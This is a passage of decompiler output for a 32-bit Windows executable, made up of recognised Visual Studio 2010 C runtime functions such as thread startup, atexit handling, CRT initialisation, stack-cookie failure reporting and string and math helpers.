  piVar3 = __errno();
  *piVar3 = iVar2;
  return;
}



/* Function: __endthreadex */

/* Library Function - Single Match
    __endthreadex
   
   Library: Visual Studio 2010 Release */

void __cdecl __endthreadex(uint _Retval)

{
  _ptiddata _Ptd;
  
  _Ptd = __getptd_noexit();
  if (_Ptd != (_ptiddata)0x0) {
    __freeptd(_Ptd);
  }
                    /* WARNING: Subroutine does not return */
  ExitThread(_Retval);
}



/* Function: __callthreadstartex */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* Library Function - Single Match
    __callthreadstartex
   
   Library: Visual Studio 2010 Release */

void __callthreadstartex(void)

{
  _ptiddata p_Var1;
  uint _Retval;
  _EXCEPTION_POINTERS *local_18;
  
  p_Var1 = __getptd();
  _Retval = (*(code *)p_Var1->_initaddr)(p_Var1->_initarg);
  __endthreadex(_Retval);
  __XcptFilter(local_18->ExceptionRecord->ExceptionCode,local_18);
  return;
}



/* Function: __threadstartex@4 */

/* Library Function - Single Match
    __threadstartex@4
   
   Library: Visual Studio 2010 Release */

void __threadstartex_4(DWORD *param_1)

{
  code *pcVar1;
  undefined4 uVar2;
  int iVar3;
  DWORD DVar4;
  DWORD *pDVar5;
  
  ___set_flsgetvalue();
  uVar2 = FUN_00409872();
  iVar3 = ___fls_getvalue_4(uVar2);
  if (iVar3 == 0) {
    pDVar5 = param_1;
    uVar2 = FUN_00409872();
    iVar3 = ___fls_setvalue_8(uVar2,pDVar5);
    if (iVar3 == 0) {
      DVar4 = GetLastError();
                    /* WARNING: Subroutine does not return */
      ExitThread(DVar4);
    }
    DVar4 = GetCurrentThreadId();
    *param_1 = DVar4;
  }
  else {
    *(DWORD *)(iVar3 + 0x54) = param_1[0x15];
    *(DWORD *)(iVar3 + 0x58) = param_1[0x16];
    *(DWORD *)(iVar3 + 4) = param_1[1];
    __freefls_4(param_1);
  }
  __callthreadstartex();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* Function: __beginthreadex */

/* Library Function - Single Match
    __beginthreadex
   
   Library: Visual Studio 2010 Release */

uintptr_t __cdecl
__beginthreadex(void *_Security,uint _StackSize,_StartAddress *_StartAddress,void *_ArgList,
               uint _InitFlag,uint *_ThrdAddr)

{
  _StartAddress *p_Var1;
  int *piVar2;
  _ptiddata _Ptd;
  _ptiddata p_Var3;
  _StartAddress **lpThreadId;
  HANDLE pvVar4;
  DWORD DVar5;
  
  p_Var1 = _StartAddress;
  DVar5 = 0;
  if (_StartAddress == (_StartAddress *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_004087f3();
  }
  else {
    ___set_flsgetvalue();
    _Ptd = (_ptiddata)__calloc_crt(1,0x214);
    if (_Ptd != (_ptiddata)0x0) {
      p_Var3 = __getptd();
      __initptd(_Ptd,p_Var3->ptlocinfo);
      _Ptd->_thandle = 0xffffffff;
      _Ptd->_initarg = _ArgList;
      _Ptd->_initaddr = p_Var1;
      lpThreadId = (_StartAddress **)_ThrdAddr;
      if (_ThrdAddr == (uint *)0x0) {
        lpThreadId = &_StartAddress;
      }
      pvVar4 = CreateThread((LPSECURITY_ATTRIBUTES)_Security,_StackSize,__threadstartex_4,_Ptd,
                            _InitFlag,(LPDWORD)lpThreadId);
      if (pvVar4 != (HANDLE)0x0) {
        return (uintptr_t)pvVar4;
      }
      DVar5 = GetLastError();
    }
    _free(_Ptd);
    if (DVar5 != 0) {
      __dosmaperr(DVar5);
    }
  }
  return 0;
}



/* Function: FUN_0040747b */

void FUN_0040747b(void *param_1)

{
  FUN_004069ca(param_1);
  return;
}



/* Function: __onexit_nolock */

/* Library Function - Single Match
    __onexit_nolock
   
   Library: Visual Studio 2010 Release */

PVOID __cdecl __onexit_nolock(PVOID param_1)

{
  undefined4 *_Memory;
  undefined4 *puVar1;
  size_t sVar2;
  size_t sVar3;
  PVOID pvVar4;
  int iVar5;
  
  _Memory = (undefined4 *)DecodePointer(DAT_0041ebc8);
  puVar1 = (undefined4 *)DecodePointer(DAT_0041ebc4);
  if ((puVar1 < _Memory) || (iVar5 = (int)puVar1 - (int)_Memory, iVar5 + 4U < 4)) {
    return (PVOID)0x0;
  }
  sVar2 = __msize(_Memory);
  if (sVar2 < iVar5 + 4U) {
    sVar3 = 0x800;
    if (sVar2 < 0x800) {
      sVar3 = sVar2;
    }
    if ((sVar3 + sVar2 < sVar2) ||
       (pvVar4 = __realloc_crt(_Memory,sVar3 + sVar2), pvVar4 == (void *)0x0)) {
      if (sVar2 + 0x10 < sVar2) {
        return (PVOID)0x0;
      }
      pvVar4 = __realloc_crt(_Memory,sVar2 + 0x10);
      if (pvVar4 == (void *)0x0) {
        return (PVOID)0x0;
      }
    }
    puVar1 = (undefined4 *)((int)pvVar4 + (iVar5 >> 2) * 4);
    DAT_0041ebc8 = EncodePointer(pvVar4);
  }
  pvVar4 = EncodePointer(param_1);
  *puVar1 = pvVar4;
  DAT_0041ebc4 = EncodePointer(puVar1 + 1);
  return param_1;
}



/* Function: __onexit */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    __onexit
   
   Library: Visual Studio 2010 Release */

_onexit_t __cdecl __onexit(_onexit_t _Func)

{
  _onexit_t p_Var1;
  
  FUN_0040817c();
  p_Var1 = (_onexit_t)__onexit_nolock(_Func);
  FUN_004075a3();
  return p_Var1;
}



/* Function: FUN_004075a3 */

void FUN_004075a3(void)

{
  FUN_00408185();
  return;
}



/* Function: _atexit */

/* Library Function - Single Match
    _atexit
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

int __cdecl _atexit(_func_4879 *param_1)

{
  _onexit_t p_Var1;
  
  p_Var1 = __onexit((_onexit_t)param_1);
  return (p_Var1 != (_onexit_t)0x0) - 1;
}



/* Function: __vsnprintf_helper */

/* Library Function - Single Match
    __vsnprintf_helper
   
   Library: Visual Studio 2010 Release */

int __cdecl
__vsnprintf_helper(undefined *param_1,char *param_2,uint param_3,int param_4,undefined4 param_5,
                  undefined4 param_6)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  char **ppcVar4;
  FILE local_24;
  
  local_24._ptr = (char *)0x0;
  ppcVar4 = (char **)&local_24._cnt;
  for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {
    *ppcVar4 = (char *)0x0;
    ppcVar4 = ppcVar4 + 1;
  }
  if (param_4 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004087f3();
    iVar3 = -1;
  }
  else if ((param_3 == 0) || (param_2 != (char *)0x0)) {
    local_24._cnt = 0x7fffffff;
    if (param_3 < 0x80000000) {
      local_24._cnt = param_3;
    }
    local_24._flag = 0x42;
    local_24._base = param_2;
    local_24._ptr = param_2;
    iVar3 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
    if (param_2 != (char *)0x0) {
      if (-1 < iVar3) {
        local_24._cnt = local_24._cnt - 1;
        if (-1 < local_24._cnt) {
          *local_24._ptr = '\0';
          return iVar3;
        }
        iVar2 = __flsbuf(0,&local_24);
        if (iVar2 != -1) {
          return iVar3;
        }
      }
      param_2[param_3 - 1] = '\0';
      iVar3 = (-1 < local_24._cnt) - 2;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004087f3();
    iVar3 = -1;
  }
  return iVar3;
}



/* Function: __vsprintf_s_l */

/* Library Function - Single Match
    __vsprintf_s_l
   
   Library: Visual Studio 2010 Release */

int __cdecl
__vsprintf_s_l(char *_DstBuf,size_t _DstSize,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  int *piVar1;
  int iVar2;
  
  if (_Format == (char *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004087f3();
    return -1;
  }
  if ((_DstBuf == (char *)0x0) || (_DstSize == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
  }
  else {
    iVar2 = __vsnprintf_helper(__output_s_l,_DstBuf,_DstSize,(int)_Format,_Locale,_ArgList);
    if (iVar2 < 0) {
      *_DstBuf = '\0';
    }
    if (iVar2 != -2) {
      return iVar2;
    }
    piVar1 = __errno();
    *piVar1 = 0x22;
  }
  FUN_004087f3();
  return -1;
}



/* Function: _vsprintf_s */

/* Library Function - Single Match
    _vsprintf_s
   
   Library: Visual Studio 2010 Release */

int __cdecl _vsprintf_s(char *_DstBuf,size_t _SizeInBytes,char *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = __vsprintf_s_l(_DstBuf,_SizeInBytes,_Format,(_locale_t)0x0,_ArgList);
  return iVar1;
}



/* Function: __wtol */

/* Library Function - Single Match
    __wtol
   
   Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release */

long __cdecl __wtol(wchar_t *_Str)

{
  long lVar1;
  
  lVar1 = _wcstol(_Str,(wchar_t **)0x0,10);
  return lVar1;
}



/* Function: FUN_00407734 */

void __cdecl FUN_00407734(wchar_t *param_1)

{
  __wtol(param_1);
  return;
}



/* Function: __wcsrev */

/* Library Function - Single Match
    __wcsrev
   
   Library: Visual Studio 2010 Release */

wchar_t * __cdecl __wcsrev(wchar_t *_Str)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  wchar_t *pwVar3;
  wchar_t *pwVar4;
  
  pwVar3 = _Str;
  pwVar2 = _Str;
  do {
    pwVar4 = pwVar2;
    pwVar2 = pwVar4 + 1;
  } while (*pwVar4 != L'\0');
  pwVar4 = pwVar4 + -1;
  if (_Str < pwVar4) {
    do {
      wVar1 = *_Str;
      *_Str = *pwVar4;
      *pwVar4 = wVar1;
      _Str = _Str + 1;
      pwVar4 = pwVar4 + -1;
    } while (_Str < pwVar4);
  }
  return pwVar3;
}



/* Function: fast_error_exit */

/* Library Function - Single Match
    _fast_error_exit
   
   Library: Visual Studio 2010 Release */

void __cdecl fast_error_exit(int param_1)

{
  if (DAT_0041ab84 != 2) {
    __FF_MSGBANNER();
  }
  __NMSG_WRITE(param_1);
  ___crtExitProcess(0xff);
  return;
}



/* Function: ___tmainCRTStartup */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    ___tmainCRTStartup
   
   Library: Visual Studio 2010 Release */

int ___tmainCRTStartup(void)

{
  int iVar1;
  bool bVar2;
  
  if (DAT_0041ebe4 == 0) {
    HeapSetInformation((HANDLE)0x0,HeapEnableTerminationOnCorruption,(PVOID)0x0,0);
  }
  if ((((IMAGE_DOS_HEADER_00400000.e_magic == (char  [2])0x5a4d) &&
       (*(int *)(IMAGE_DOS_HEADER_00400000.e_lfanew + 0x400000) == 0x4550)) &&
      (*(short *)((int)IMAGE_DOS_HEADER_00400000.e_res_4_ + (IMAGE_DOS_HEADER_00400000.e_lfanew - 4)
                 ) == 0x10b)) &&
     (0xe < *(uint *)(IMAGE_DOS_HEADER_00400000.e_program +
                     IMAGE_DOS_HEADER_00400000.e_lfanew + 0x34))) {
    bVar2 = *(int *)(IMAGE_NT_HEADERS32_004000e8.Signature + IMAGE_DOS_HEADER_00400000.e_lfanew) !=
            0;
  }
  else {
    bVar2 = false;
  }
  iVar1 = __heap_init();
  if (iVar1 == 0) {
    fast_error_exit(0x1c);
  }
  iVar1 = __mtinit();
  if (iVar1 == 0) {
    fast_error_exit(0x10);
  }
  __RTC_Initialize();
  iVar1 = __ioinit();
  if (iVar1 < 0) {
    __amsg_exit(0x1b);
  }
  DAT_0041ebe0 = GetCommandLineW();
  DAT_0041ab80 = ___crtGetEnvironmentStringsW();
  iVar1 = __wsetargv();
  if (iVar1 < 0) {
    __amsg_exit(8);
  }
  iVar1 = __wsetenvp();
  if (iVar1 < 0) {
    __amsg_exit(9);
  }
  iVar1 = __cinit(1);
  if (iVar1 != 0) {
    __amsg_exit(iVar1);
  }
  _DAT_0041aed8 = DAT_0041aed4;
  iVar1 = FUN_00406530();
  if (!bVar2) {
                    /* WARNING: Subroutine does not return */
    _exit(iVar1);
  }
  __cexit();
  return iVar1;
}



/* Function: entry */

void entry(void)

{
  ___security_init_cookie();
  ___tmainCRTStartup();
  return;
}



/* Function: __CxxThrowException@8 */

/* Library Function - Single Match
    __CxxThrowException@8
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

void __CxxThrowException_8(undefined4 param_1,byte *param_2)

{
  int iVar1;
  DWORD *pDVar2;
  DWORD *pDVar3;
  DWORD local_24 [4];
  DWORD local_14;
  ULONG_PTR local_10;
  undefined4 local_c;
  byte *local_8;
  
  pDVar2 = &DAT_0041532c;
  pDVar3 = local_24;
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *pDVar3 = *pDVar2;
    pDVar2 = pDVar2 + 1;
    pDVar3 = pDVar3 + 1;
  }
  local_c = param_1;
  local_8 = param_2;
  if ((param_2 != (byte *)0x0) && ((*param_2 & 8) != 0)) {
    local_10 = 0x1994000;
  }
  RaiseException(local_24[0],local_24[1],local_14,&local_10);
  return;
}



/* Function: ___report_gsfailure */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    ___report_gsfailure
   
   Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release */

void __cdecl ___report_gsfailure(void)

{
  undefined4 in_EAX;
  HANDLE hProcess;
  undefined4 in_ECX;
  undefined4 in_EDX;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined2 in_ES;
  undefined2 in_CS;
  undefined2 in_SS;
  undefined2 in_DS;
  undefined2 in_FS;
  undefined2 in_GS;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  undefined4 unaff_retaddr;
  UINT uExitCode;
  undefined4 local_32c;
  undefined4 local_328;
  
  _DAT_0041aca0 =
       (uint)(in_NT & 1) * 0x4000 | (uint)SBORROW4((int)&stack0xfffffffc,0x328) * 0x800 |
       (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | (uint)((int)&local_32c < 0) * 0x80 |
       (uint)(&stack0x00000000 == (undefined1 *)0x32c) * 0x40 | (uint)(in_AF & 1) * 0x10 |
       (uint)((POPCOUNT((uint)&local_32c & 0xff) & 1U) == 0) * 4 |
       (uint)(&stack0xfffffffc < (undefined1 *)0x328) | (uint)(in_ID & 1) * 0x200000 |
       (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000;
  _DAT_0041aca4 = &stack0x00000004;
  _DAT_0041abe0 = 0x10001;
  _DAT_0041ab88 = 0xc0000409;
  _DAT_0041ab8c = 1;
  local_32c = DAT_004191b4;
  local_328 = DAT_004191b8;
  _DAT_0041ab94 = unaff_retaddr;
  _DAT_0041ac6c = in_GS;
  _DAT_0041ac70 = in_FS;
  _DAT_0041ac74 = in_ES;
  _DAT_0041ac78 = in_DS;
  _DAT_0041ac7c = unaff_EDI;
  _DAT_0041ac80 = unaff_ESI;
  _DAT_0041ac84 = unaff_EBX;
  _DAT_0041ac88 = in_EDX;
  _DAT_0041ac8c = in_ECX;
  _DAT_0041ac90 = in_EAX;
  _DAT_0041ac94 = unaff_EBP;
  DAT_0041ac98 = unaff_retaddr;
  _DAT_0041ac9c = in_CS;
  _DAT_0041aca8 = in_SS;
  DAT_0041abd8 = IsDebuggerPresent();
  FUN_0040b622();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&PTR_DAT_0041534c);
  if (DAT_0041abd8 == 0) {
    FUN_0040b622();
  }
  uExitCode = 0xc0000409;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



/* Function: FUN_00407a5f */

undefined4 * __fastcall FUN_00407a5f(uint param_1)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  uint uVar16;
  uint uVar17;
  undefined4 *unaff_ESI;
  undefined4 *unaff_EDI;
  undefined4 *puVar18;
  
  puVar18 = unaff_EDI;
  if (((uint)unaff_ESI & 0xf) != 0) {
    uVar17 = 0x10 - ((uint)unaff_ESI & 0xf);
    param_1 = param_1 - uVar17;
    for (uVar16 = uVar17 & 3; uVar16 != 0; uVar16 = uVar16 - 1) {
      *(undefined1 *)puVar18 = *(undefined1 *)unaff_ESI;
      unaff_ESI = (undefined4 *)((int)unaff_ESI + 1);
      puVar18 = (undefined4 *)((int)puVar18 + 1);
    }
    for (uVar17 = uVar17 >> 2; uVar17 != 0; uVar17 = uVar17 - 1) {
      *puVar18 = *unaff_ESI;
      unaff_ESI = unaff_ESI + 1;
      puVar18 = puVar18 + 1;
    }
  }
  for (uVar16 = param_1 >> 7; uVar16 != 0; uVar16 = uVar16 - 1) {
    uVar1 = unaff_ESI[1];
    uVar2 = unaff_ESI[2];
    uVar3 = unaff_ESI[3];
    uVar4 = unaff_ESI[4];
    uVar5 = unaff_ESI[5];
    uVar6 = unaff_ESI[6];
    uVar7 = unaff_ESI[7];
    uVar8 = unaff_ESI[8];
    uVar9 = unaff_ESI[9];
    uVar10 = unaff_ESI[10];
    uVar11 = unaff_ESI[0xb];
    uVar12 = unaff_ESI[0xc];
    uVar13 = unaff_ESI[0xd];
    uVar14 = unaff_ESI[0xe];
    uVar15 = unaff_ESI[0xf];
    *puVar18 = *unaff_ESI;
    puVar18[1] = uVar1;
    puVar18[2] = uVar2;
    puVar18[3] = uVar3;
    puVar18[4] = uVar4;
    puVar18[5] = uVar5;
    puVar18[6] = uVar6;
    puVar18[7] = uVar7;
    puVar18[8] = uVar8;
    puVar18[9] = uVar9;
    puVar18[10] = uVar10;
    puVar18[0xb] = uVar11;
    puVar18[0xc] = uVar12;
    puVar18[0xd] = uVar13;
    puVar18[0xe] = uVar14;
    puVar18[0xf] = uVar15;
    uVar1 = unaff_ESI[0x11];
    uVar2 = unaff_ESI[0x12];
    uVar3 = unaff_ESI[0x13];
    uVar4 = unaff_ESI[0x14];
    uVar5 = unaff_ESI[0x15];
    uVar6 = unaff_ESI[0x16];
    uVar7 = unaff_ESI[0x17];
    uVar8 = unaff_ESI[0x18];
    uVar9 = unaff_ESI[0x19];
    uVar10 = unaff_ESI[0x1a];
    uVar11 = unaff_ESI[0x1b];
    uVar12 = unaff_ESI[0x1c];
    uVar13 = unaff_ESI[0x1d];
    uVar14 = unaff_ESI[0x1e];
    uVar15 = unaff_ESI[0x1f];
    puVar18[0x10] = unaff_ESI[0x10];
    puVar18[0x11] = uVar1;
    puVar18[0x12] = uVar2;
    puVar18[0x13] = uVar3;
    puVar18[0x14] = uVar4;
    puVar18[0x15] = uVar5;
    puVar18[0x16] = uVar6;
    puVar18[0x17] = uVar7;
    puVar18[0x18] = uVar8;
    puVar18[0x19] = uVar9;
    puVar18[0x1a] = uVar10;
    puVar18[0x1b] = uVar11;
    puVar18[0x1c] = uVar12;
    puVar18[0x1d] = uVar13;
    puVar18[0x1e] = uVar14;
    puVar18[0x1f] = uVar15;
    unaff_ESI = unaff_ESI + 0x20;
    puVar18 = puVar18 + 0x20;
  }
  if ((param_1 & 0x7f) != 0) {
    for (uVar16 = (param_1 & 0x7f) >> 4; uVar16 != 0; uVar16 = uVar16 - 1) {
      uVar1 = unaff_ESI[1];
      uVar2 = unaff_ESI[2];
      uVar3 = unaff_ESI[3];
      *puVar18 = *unaff_ESI;
      puVar18[1] = uVar1;
      puVar18[2] = uVar2;
      puVar18[3] = uVar3;
      unaff_ESI = unaff_ESI + 4;
      puVar18 = puVar18 + 4;
    }
    if ((param_1 & 0xf) != 0) {
      for (uVar16 = (param_1 & 0xf) >> 2; uVar16 != 0; uVar16 = uVar16 - 1) {
        *puVar18 = *unaff_ESI;
        unaff_ESI = unaff_ESI + 1;
        puVar18 = puVar18 + 1;
      }
      for (uVar16 = param_1 & 3; uVar16 != 0; uVar16 = uVar16 - 1) {
        *(undefined1 *)puVar18 = *(undefined1 *)unaff_ESI;
        unaff_ESI = (undefined4 *)((int)unaff_ESI + 1);
        puVar18 = (undefined4 *)((int)puVar18 + 1);
      }
    }
  }
  return unaff_EDI;
}



/* Function: ___libm_error_support */

/* Library Function - Single Match
    ___libm_error_support
   
   Library: Visual Studio 2010 Release */

void __cdecl ___libm_error_support(double *param_1,undefined8 *param_2,double *param_3,int param_4)

{
  code *pcVar1;
  int iVar2;
  int *piVar3;
  undefined4 local_2c;
  char *local_28;
  double local_24;
  undefined8 local_1c;
  double local_14;
  undefined4 local_c;
  undefined4 uStack_8;
  
  local_c = 0;
  uStack_8 = 0;
  if (DAT_0041aeac == 0) {
    pcVar1 = FUN_0040b62a;
  }
  else {
    pcVar1 = (code *)DecodePointer(DAT_0041ebd8);
  }
  if (param_4 < 0xa7) {
    if (param_4 == 0xa6) {
      local_2c = 3;
      local_28 = "exp10";
LAB_00407c08:
      local_24 = *param_1;
      local_1c = *param_2;
      local_14 = *param_3;
      iVar2 = (*pcVar1)(&local_2c);
      if (iVar2 == 0) {
        piVar3 = __errno();
        *piVar3 = 0x22;
      }
    }
    else {
      if (0x19 < param_4) {
        if (param_4 == 0x1a) {
          *param_3 = 1.0;
          return;
        }
        if (param_4 != 0x1b) {
          if (param_4 == 0x1c) goto switchD_00407d5f_caseD_3ee;
          if (param_4 != 0x1d) {
            if (param_4 != 0x3a) {
              if (param_4 != 0x3d) {
                return;
              }
              goto switchD_00407d5f_caseD_3f1;
            }
            goto switchD_00407d5f_caseD_3f0;
          }
          local_28 = "pow";
          goto LAB_00407d0a;
        }
        local_2c = 2;
LAB_00407c01:
        local_28 = "pow";
        goto LAB_00407c08;
      }
      if (param_4 != 0x19) {
        local_2c = 2;
        if (param_4 == 2) {
          local_2c = 2;
          local_28 = "log";
        }
        else {
          if (param_4 == 3) {
            local_28 = "log";
            goto LAB_00407c8e;
          }
          if (param_4 == 8) {
            local_28 = "log10";
          }
          else {
            if (param_4 == 9) {
              local_28 = "log10";
              goto LAB_00407c8e;
            }
            if (param_4 != 0xe) {
              if (param_4 != 0xf) {
                if (param_4 != 0x18) {
                  return;
                }
                local_2c = 3;
                goto LAB_00407c01;
              }
              local_28 = "exp";
              goto LAB_00407c46;
            }
            local_2c = 3;
            local_28 = "exp";
          }
        }
        goto LAB_00407c08;
      }
      local_28 = "pow";
LAB_00407c46:
      local_24 = *param_1;
      local_1c = *param_2;
      local_14 = *param_3;
      local_2c = 4;
      (*pcVar1)(&local_2c);
    }
    goto LAB_00407e01;
  }
  switch(param_4) {
  case 1000:
    local_28 = "log";
    break;
  case 0x3e9:
    local_28 = "log10";
    break;
  case 0x3ea:
    local_28 = "exp";
    break;
  case 0x3eb:
    local_28 = "atan";
    break;
  case 0x3ec:
    local_28 = "ceil";
    break;
  case 0x3ed:
    local_28 = "floor";
    break;
  case 0x3ee:
switchD_00407d5f_caseD_3ee:
    local_28 = "pow";
    goto LAB_00407c8e;
  case 0x3ef:
    local_28 = "modf";
    break;
  case 0x3f0:
switchD_00407d5f_caseD_3f0:
    local_28 = "acos";
    goto LAB_00407c8e;
  case 0x3f1:
switchD_00407d5f_caseD_3f1:
    local_28 = "asin";
    goto LAB_00407c8e;
  case 0x3f2:
    local_28 = "sin";
    goto LAB_00407dc7;
  case 0x3f3:
    local_28 = "cos";
    goto LAB_00407dc7;
  case 0x3f4:
    local_28 = "tan";
LAB_00407dc7:
    local_14 = *param_1 * (double)CONCAT44(uStack_8,local_c);
    *param_3 = local_14;
    local_24 = *param_1;
    local_1c = *param_2;
    goto LAB_00407de1;
  default:
    goto switchD_00407d5f_default;
  }
LAB_00407d0a:
  *param_3 = *param_1;
LAB_00407c8e:
  local_24 = *param_1;
  local_1c = *param_2;
  local_14 = *param_3;
LAB_00407de1:
  local_2c = 1;
  iVar2 = (*pcVar1)(&local_2c);
  if (iVar2 == 0) {
    piVar3 = __errno();
    *piVar3 = 0x21;
  }
LAB_00407e01:
  *param_3 = local_14;
switchD_00407d5f_default:
  return;
}



/* Function: __ceil_default */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    __ceil_default
   
   Library: Visual Studio 2010 Release */

float10 __cdecl __ceil_default(double param_1)

{
  double dVar1;
  uint uVar2;
  int iVar3;
  float10 fVar4;
  uint uVar5;
  
  uVar2 = __ctrlfp();
  if ((param_1._6_2_ & 0x7ff0) == 0x7ff0) {
    iVar3 = __sptype(SUB84(param_1,0),(uint)((ulonglong)param_1 >> 0x20));
    if (0 < iVar3) {
      if (iVar3 < 3) {
        __ctrlfp();
        return (float10)param_1;
      }
      if (iVar3 == 3) {
        fVar4 = __handle_qnan1(0xc,param_1);
        return fVar4;
      }
    }
    dVar1 = param_1 + _DAT_004153f8;
    uVar5 = 8;
  }
  else {
    fVar4 = __frnd(param_1);
    dVar1 = (double)fVar4;
    if ((param_1 == dVar1) || ((uVar2 & 0x20) != 0)) {
      __ctrlfp();
      return (float10)dVar1;
    }
    uVar5 = 0x10;
  }
  fVar4 = (float10)__except1(uVar5,0xc,param_1,dVar1,uVar2);
  return fVar4;
}



/* Function: _Type_info_dtor */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    private: static void __cdecl type_info::_Type_info_dtor(class type_info *)
   
   Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release */

void __cdecl type_info::_Type_info_dtor(type_info *param_1)

{
  int *_Memory;
  int *piVar1;
  int *piVar2;
  
  __lock(0xe);
  _Memory = DAT_0041aeb4;
  if (*(int *)(param_1 + 4) != 0) {
    piVar1 = (int *)&DAT_0041aeb0;
    do {
      piVar2 = piVar1;
      if (DAT_0041aeb4 == (int *)0x0) goto LAB_00407f6a;
      piVar1 = DAT_0041aeb4;
    } while (*DAT_0041aeb4 != *(int *)(param_1 + 4));
    piVar2[1] = DAT_0041aeb4[1];
    _free(_Memory);
LAB_00407f6a:
    _free(*(void **)(param_1 + 4));
    *(undefined4 *)(param_1 + 4) = 0;
  }
  FUN_00407f8d();
  return;
}



/* Function: FUN_00407f8d */

void FUN_00407f8d(void)

{
  FUN_0040c0a7(0xe);
  return;
}



/* Function: _strcmp */

/* Library Function - Single Match
    _strcmp
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

int __cdecl _strcmp(char *_Str1,char *_Str2)

{
  undefined2 uVar1;
  undefined4 uVar2;
  byte bVar3;
  byte bVar4;
  bool bVar5;
  
  if (((uint)_Str1 & 3) != 0) {
    if (((uint)_Str1 & 1) != 0) {
      bVar4 = *_Str1;
      _Str1 = _Str1 + 1;
      bVar5 = bVar4 < (byte)*_Str2;
      if (bVar4 != *_Str2) goto LAB_00407fe4;
      _Str2 = _Str2 + 1;
      if (bVar4 == 0) {
        return 0;
      }
      if (((uint)_Str1 & 2) == 0) goto LAB_00407fb0;
    }
    uVar1 = *(undefined2 *)_Str1;
    _Str1 = _Str1 + 2;
    bVar4 = (byte)uVar1;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) goto LAB_00407fe4;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((ushort)uVar1 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) goto LAB_00407fe4;
    if (bVar4 == 0) {
      return 0;
    }
    _Str2 = (char *)((byte *)_Str2 + 2);
  }
LAB_00407fb0:
  while( true ) {
    uVar2 = *(undefined4 *)_Str1;
    bVar4 = (byte)uVar2;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 0x10);
    bVar5 = bVar4 < ((byte *)_Str2)[2];
    if (bVar4 != ((byte *)_Str2)[2]) break;
    bVar3 = (byte)((uint)uVar2 >> 0x18);
    if (bVar4 == 0) {
      return 0;
    }
    bVar5 = bVar3 < ((byte *)_Str2)[3];
    if (bVar3 != ((byte *)_Str2)[3]) break;
    _Str2 = (char *)((byte *)_Str2 + 4);
    _Str1 = _Str1 + 4;
    if (bVar3 == 0) {
      return 0;
    }
  }
LAB_00407fe4:
  return (uint)bVar5 * -2 + 1;
}



/* Function: _strcpy_s */

/* Library Function - Single Match
    _strcpy_s
   
   Library: Visual Studio 2010 Release */

errno_t __cdecl _strcpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  int iVar3;
  errno_t eStack_10;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    if (_Src != (char *)0x0) {
      iVar3 = (int)_Dst - (int)_Src;
      do {
        cVar1 = *_Src;
        _Src[iVar3] = cVar1;
        _Src = _Src + 1;
        if (cVar1 == '\0') break;
        _SizeInBytes = _SizeInBytes - 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        return 0;
      }
      *_Dst = '\0';
